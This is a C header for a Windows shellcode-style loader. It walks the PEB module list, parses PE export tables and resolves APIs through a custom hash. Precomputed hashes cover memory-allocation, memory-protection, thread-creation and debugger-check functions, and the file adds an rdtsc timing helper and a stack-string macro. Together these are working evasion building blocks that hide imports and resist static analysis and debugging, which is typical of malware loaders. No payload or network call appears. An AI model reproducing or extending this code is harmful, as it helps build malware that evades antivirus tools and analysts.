#ifndef LDR_H
#define LDR_H


typedef unsigned long   DWORD;
typedef unsigned short  WORD;
typedef unsigned char   BYTE;
typedef unsigned int    UINT;
typedef unsigned long   SIZE_T;
typedef long            NTSTATUS;
typedef void*           HANDLE;
typedef void*           HWND;
typedef void*           HMODULE;
typedef void*           LPVOID;
typedef const void*     LPCVOID;
typedef void*           LPSECURITY_ATTRIBUTES;
typedef const char*     LPCSTR;
typedef char*           LPSTR;
typedef DWORD*          LPDWORD;
typedef int             BOOL;


typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY* Flink;
    struct _LIST_ENTRY* Blink;
} LIST_ENTRY, *PLIST_ENTRY;

typedef struct _PEB_LDR_DATA {
    BYTE       Reserved1[8];
    void*      Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InMemoryOrderLinks;
    void*      Reserved2[2];
    void*      DllBase;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BYTE          Reserved1[2];
    BYTE          BeingDebugged;
    BYTE          Reserved2[1];
    void*         Reserved3[2];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;


typedef struct {
    DWORD Characteristics;  DWORD TimeDateStamp;
    WORD  MajorVersion;     WORD  MinorVersion;
    DWORD Name;             DWORD Base;
    DWORD NumberOfFunctions; DWORD NumberOfNames;
    DWORD AddressOfFunctions;
    DWORD AddressOfNames;
    DWORD AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY;


typedef DWORD (__attribute__((stdcall)) *LPTHREAD_START_ROUTINE)(void* lpParam);

typedef HANDLE (__attribute__((stdcall)) *FN_GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef HMODULE(__attribute__((stdcall)) *FN_LoadLibraryA)  (LPCSTR lpLibFileName);

typedef HANDLE   (__attribute__((stdcall)) *FN_CreateThread)(
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
);
typedef LPVOID   (__attribute__((stdcall)) *FN_VirtualAlloc)(
    LPVOID lpAddress, SIZE_T dwSize,
    DWORD  flAllocationType, DWORD flProtect
);
typedef BOOL     (__attribute__((stdcall)) *FN_VirtualProtect)(
    LPVOID lpAddress, SIZE_T dwSize,
    DWORD  flNewProtect, LPDWORD lpflOldProtect
);
typedef BOOL     (__attribute__((stdcall)) *FN_VirtualFree)(
    LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType
);

typedef NTSTATUS (__attribute__((stdcall)) *FN_RtlMoveMemory)(
    void* dst, const void* src, SIZE_T len
);
typedef BOOL     (__attribute__((stdcall)) *FN_FlushInstructionCache)(
    HANDLE hProcess, LPCVOID lpBaseAddress, SIZE_T dwSize
);
typedef DWORD    (__attribute__((stdcall)) *FN_WaitForSingleObject)(
    HANDLE hHandle, DWORD dwMilliseconds
);
typedef BOOL     (__attribute__((stdcall)) *FN_CloseHandle)(HANDLE hObject);

typedef BOOL    (__attribute__((stdcall)) *FN_IsDebuggerPresent)(void);

typedef HANDLE  (__attribute__((stdcall)) *FN_GetProcessHeap)(void);

typedef int     (__attribute__((stdcall)) *FN_MessageBoxA)(
    HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType
);


#define MEM_COMMIT_RESERVE  0x3000
#define MEM_RELEASE         0x8000
#define PAGE_READWRITE      0x04
#define PAGE_EXEC_READ      0x20
#define PAGE_EXEC_RW        0x40
#define INFINITE            0xFFFFFFFF


#define HASH_GETPROCADDRESS         0xAFA3E09D
#define HASH_LOADLIBRARYA           0x7069F241
#define HASH_CREATETHREAD           0x8DF92F7B
#define HASH_VIRTUALALLOC           0x5AE0DABF
#define HASH_VIRTUALPROTECT         0x927857D9
#define HASH_VIRTUALFREE            0x640675A2
#define HASH_RTLMOVEMEMORY          0x35C28707
#define HASH_FLUSHINSTRUCTIONCACHE  0x3CC05103
#define HASH_WAITFORSINGLEOBJECT    0x93397566
#define HASH_CLOSEHANDLE            0x47BDD9CB
#define HASH_ISDEBUGGERPRESENT      0x0EF4ED1B
#define HASH_GETPROCESSHEAP         0xF3B49F5A
#define HASH_MESSAGEBOXA            0xCC4A1D08

#define SSTR(var, ...) volatile char var[] = { __VA_ARGS__ }


static inline __attribute__((always_inline))
unsigned long long ldr_rdtsc(void)
{
    unsigned int lo, hi;
    __asm__ __volatile__("rdtsc" : "=a"(lo), "=d"(hi));
    return ((unsigned long long)hi << 32) | lo;
}

static inline __attribute__((always_inline))
PPEB ldr_get_peb(void)
{
    PPEB peb;
    __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(peb));
    return peb;
}


static inline __attribute__((always_inline))
DWORD api_hash(const char* s)
{
    if (!s || !*s) return 0;
    DWORD h = 0x35;
    while (*s) {
        h = h * 0xAB10F29F + (unsigned char)*s;
        s++;
    }
    return h;
}


static inline __attribute__((always_inline))
void* ldr_find_export_by_hash(BYTE* base, DWORD target)
{
    if (!base) return 0;
    if (*(WORD*)base != 0x5A4D) return 0;

    DWORD e_lfanew = *(DWORD*)(base + 0x3C);
    if (*(DWORD*)(base + e_lfanew) != 0x00004550) return 0;

    DWORD exp_rva = *(DWORD*)(base + e_lfanew + 4 + 20 + 96);
    if (!exp_rva) return 0;

    IMAGE_EXPORT_DIRECTORY* exp =
        (IMAGE_EXPORT_DIRECTORY*)(base + exp_rva);
    DWORD* names = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ords  = (WORD*) (base + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)(base + exp->AddressOfFunctions);

    DWORD i;
    for (i = 0; i < exp->NumberOfNames; i++) {
        char* name = (char*)(base + names[i]);
        if (!name || !*name) continue;
        if (api_hash(name) == target)
            return (void*)(base + funcs[ords[i]]);
    }
    return 0;
}


static inline __attribute__((always_inline))
void* ldr_get_by_hash(DWORD target, void** out_base)
{
    PPEB peb = ldr_get_peb();
    PLIST_ENTRY           head = &peb->Ldr->InMemoryOrderModuleList;
    PLDR_DATA_TABLE_ENTRY node = (PLDR_DATA_TABLE_ENTRY)head->Flink;

    while ((PLIST_ENTRY)node != head) {
        void* fn = ldr_find_export_by_hash((BYTE*)node->DllBase, target);
        if (fn) {
            if (out_base) *out_base = node->DllBase;
            return fn;
        }
        node = (PLDR_DATA_TABLE_ENTRY)node->InMemoryOrderLinks.Flink;
    }
    return 0;
}

#endif
